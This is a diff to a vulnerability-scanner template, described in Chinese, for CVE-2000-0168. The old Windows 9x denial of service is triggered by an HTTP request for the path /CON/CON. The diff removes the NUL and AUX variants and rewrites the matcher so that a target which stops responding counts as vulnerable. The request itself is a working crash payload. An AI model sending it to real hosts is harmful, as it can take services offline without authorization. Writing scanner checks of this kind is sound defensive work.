@@ -1,17 +1,21 @@
 [info]
 author = "ave"
-description = "通过向 Windows 9x 系统上的 Web 服务发送包含 DOS 设备名（如 CON、NUL、AUX）的特制 HTTP 请求路径，触发系统对设备名路径的异常处理，导致蓝屏崩溃或系统挂起，造成拒绝服务。"
+description = "向目标 HTTP 服务发送包含 DOS 保留设备名（CON）的路径请求，若服务器崩溃无法响应则验证存在 CVE-2000-0168 设备名路径解析拒绝服务漏洞。"
 id = "POC-AVE-2000-0148"
-name = "Microsoft Windows 9x DOS Device Name Path DoS PoC"
+name = "Microsoft Windows 设备名路径拒绝服务漏洞 PoC"
 severity = "medium"
-tags = ["ave-2000-0148"]
+tags = [
+    "cve-2000-0168",
+    "dos",
+    "windows",
+]
 vuln_id = [
     "CVE-2000-0168",
     "AVE-2000-0148",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
@@ -19,38 +23,7 @@ path = "/{{BaseURL}}/CON/CON"
 protocol = "http"
 
 [[poc.requests.matchers]]
-expect = true
-part = "body"
+expect = false
+part = "header"
 type = "word"
-words = [
-    "Connection: close",
-    "Service Unavailable",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/NUL/NUL"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "Connection: close",
-    "Service Unavailable",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/AUX/AUX"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "Connection: close",
-    "Service Unavailable",
-]
+words = ["HTTP/"]
